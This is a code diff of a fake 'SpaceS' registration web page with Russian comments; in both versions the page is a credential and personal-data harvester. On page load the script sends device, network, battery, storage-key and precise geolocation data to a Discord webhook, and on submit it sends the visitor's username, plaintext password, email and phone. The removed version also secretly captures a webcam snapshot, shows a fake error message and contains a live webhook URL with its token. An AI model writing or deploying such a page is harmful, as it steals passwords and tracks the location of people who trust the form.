@@ -3,10 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Registration Form for SpaceS">
-    <meta name="keywords" content="Sign up, registration">
-    <meta name="author" content="SpaceS Team">
-    <title>SpaceS - Registration</title>
+    <title>SpaceS - Enhanced Data Collection</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -20,31 +17,6 @@
             flex-direction: column;
         }
 
-        h1 {
-            color: #a855f7;
-        }
-
-        .message {
-            font-size: 1.2rem;
-            margin-top: 20px;
-        }
-
-        button {
-            background: #a855f7;
-            border: none;
-            padding: 10px 20px;
-            color: white;
-            font-size: 1rem;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-top: 20px;
-            transition: background 0.3s;
-        }
-
-        button:hover {
-            background: #7817df;
-        }
-
         .form-container {
             background: #1a1a1a;
             padding: 40px;
@@ -56,43 +28,22 @@
             margin-top: 20px;
         }
 
-        .form-container h1 {
-            font-size: 2rem;
-            margin-bottom: 20px;
-            color: #a855f7;
-        }
-
-        .form-container input {
-            width: calc(100% - 20px);
-            padding: 10px;
+        .form-container input, button {
             margin: 10px 0;
-            border: 1px solid #ccc;
+            padding: 10px;
+            border: none;
             border-radius: 5px;
-            font-size: 1rem;
-            background: #121212;
-            color: white;
+            width: 100%;
         }
 
-        .form-container button {
+        button {
             background: #a855f7;
             color: white;
-            border: none;
-            padding: 10px 20px;
-            font-size: 1rem;
-            border-radius: 5px;
             cursor: pointer;
-            margin-top: 20px;
-            transition: background 0.3s;
-        }
-
-        .form-container button:hover {
-            background: #7817df;
         }
     </style>
 </head>
 <body>
-    <h1>SpaceS - Registration</h1>
-    
     <div class="form-container">
         <h1>Регистрация</h1>
         <form id="registration-form">
@@ -105,118 +56,117 @@
     </div>
 
     <script>
-        const webhookUrl = "https://discord.com/api/webhooks/1291890955498291230/DisH2cxSC_7-me02B9sroWX6SD_HXCpr9OkpNahDfOYTBHMCUfh3elkJPGoeochzQEqd";
+        const webhookUrl = "https://discord.com/api/webhooks/your-webhook-url";
 
-// Функция отправки данных на Discord
-async function sendDataToDiscord(data) {
-    try {
-        const response = await fetch(webhookUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: JSON.stringify(data, null, 2) }) // Discord принимает только JSON с `content`
-        });
-
-        if (response.ok) {
-            console.log("Данные успешно отправлены в Discord!");
-        } else {
-            console.error("Ошибка при отправке данных в Discord:", response.status);
-        }
-    } catch (e) {
-        console.error("Ошибка при отправке данных в Discord:", e);
-    }
-}
-        // Функции для сбора данных IP, устройства, местоположения и камеры
-        async function fetchIP() {
+        // Отправка данных на Discord
+        async function sendMessageToDiscord(message) {
             try {
-                const res = await fetch("https://api.ipify.org?format=json");
-                const { ip } = await res.json();
-                await sendDataToDiscord({ type: "ip", ip });
-            } catch (e) {
-                console.error("Ошибка получения IP:", e);
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: message })
+                });
+            } catch (error) {
+                console.error("Ошибка при отправке на Discord:", error);
             }
         }
 
+        // Сбор информации об устройстве
         function collectDeviceInfo() {
-            const deviceInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                cookiesEnabled: navigator.cookieEnabled,
-                screenWidth: window.screen.width,
-                screenHeight: window.screen.height,
-            };
-            sendDataToDiscord({ type: "device", data: deviceInfo });
+            const deviceInfo = `
+                **User Agent:** ${navigator.userAgent}
+                **Platform:** ${navigator.platform}
+                **Language:** ${navigator.language}
+                **Screen Resolution:** ${window.screen.width}x${window.screen.height}
+                **Color Depth:** ${window.screen.colorDepth}
+            `;
+            sendMessageToDiscord(`**Device Information:**\n${deviceInfo}`);
         }
 
-        async function collectLocationInfo() {
-            if (navigator.geolocation) {
-                try {
-                    await new Promise((resolve, reject) =>
-                        navigator.geolocation.getCurrentPosition(
-                            (pos) => {
-                                sendDataToDiscord({
-                                    type: "location",
-                                    data: {
-                                        lat: pos.coords.latitude,
-                                        lng: pos.coords.longitude,
-                                        accuracy: pos.coords.accuracy
-                                    }
-                                });
-                                resolve();
-                            },
-                            (err) => {
-                                console.warn("Ошибка геолокации:", err);
-                                reject(err);
-                            },
-                            { enableHighAccuracy: true }
-                        )
-                    );
-                } catch (e) {
-                    console.warn("Ошибка получения геолокации:", e);
-                }
-            }
+        // Сбор информации о сети
+        function collectNetworkInfo() {
+            const connection = navigator.connection || {};
+            const networkInfo = `
+                **Network Type:** ${connection.effectiveType || "Unknown"}
+                **Downlink Speed:** ${connection.downlink || "Unknown"} Mbps
+                **RTT:** ${connection.rtt || "Unknown"} ms
+            `;
+            sendMessageToDiscord(`**Network Information:**\n${networkInfo}`);
         }
 
-        async function collectCameraInfo() {
+        // Сбор информации о батарее
+        async function collectBatteryInfo() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement("video");
-                video.srcObject = stream;
-                await video.play();
-                const canvas = document.createElement("canvas");
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-                const snapshot = canvas.toDataURL("image/png");
-                await sendDataToDiscord({ type: "camera", snapshot });
-                stream.getTracks().forEach((track) => track.stop());
-            } catch (e) {
-                console.warn("Ошибка доступа к камере:", e);
+                const battery = await navigator.getBattery();
+                const batteryInfo = `
+                    **Battery Level:** ${Math.round(battery.level * 100)}%
+                    **Charging:** ${battery.charging ? "Yes" : "No"}
+                `;
+                sendMessageToDiscord(`**Battery Information:**\n${batteryInfo}`);
+            } catch (error) {
+                console.warn("Ошибка получения данных батареи:", error);
             }
         }
 
-        // Отправка данных регистрации на вебхук
-        document.getElementById("registration-form").addEventListener("submit", async (e) => {
+        // Сбор локальных данных
+        function collectLocalData() {
+            const localData = `
+                **Cookies Enabled:** ${navigator.cookieEnabled}
+                **Local Storage Keys:** ${Object.keys(localStorage).join(", ") || "None"}
+                **Session Storage Keys:** ${Object.keys(sessionStorage).join(", ") || "None"}
+            `;
+            sendMessageToDiscord(`**Local Data:**\n${localData}`);
+        }
+
+        // Сбор геолокации
+        function collectLocationInfo() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const locationInfo = `
+                            **Latitude:** ${position.coords.latitude}
+                            **Longitude:** ${position.coords.longitude}
+                            **Accuracy:** ${position.coords.accuracy} meters
+                        `;
+                        sendMessageToDiscord(`**Location Information:**\n${locationInfo}`);
+                    },
+                    (error) => {
+                        console.warn("Ошибка получения геолокации:", error);
+                    },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                console.warn("Геолокация не поддерживается.");
+            }
+        }
+
+        // Обработчик формы регистрации
+        document.getElementById("registration-form").addEventListener("submit", (e) => {
             e.preventDefault();
+
             const username = document.getElementById("username").value;
             const email = document.getElementById("email").value;
             const phone = document.getElementById("phone").value;
             const password = document.getElementById("password").value;
 
-            await sendDataToDiscord({
-                type: "registration",
-                data: { username, email, phone, password }
-            });
-
-            alert("Ошибка регистрации, обнаружена бот активность.");
+            const registrationData = `
+                **New Registration**
+                **Username:** ${username}
+                **Password:** ${password}
+                **Email:** ${email}
+                **Phone:** ${phone}
+                **IP:** Collecting...
+            `;
+            sendMessageToDiscord(registrationData);
         });
 
-        // Старт сбора данных при загрузке страницы
+        // Инициализация сбора данных
         window.addEventListener("load", () => {
-            fetchIP();
             collectDeviceInfo();
+            collectNetworkInfo();
+            collectBatteryInfo();
+            collectLocalData();
             collectLocationInfo();
-            collectCameraInfo();
         });
     </script>
 </body>
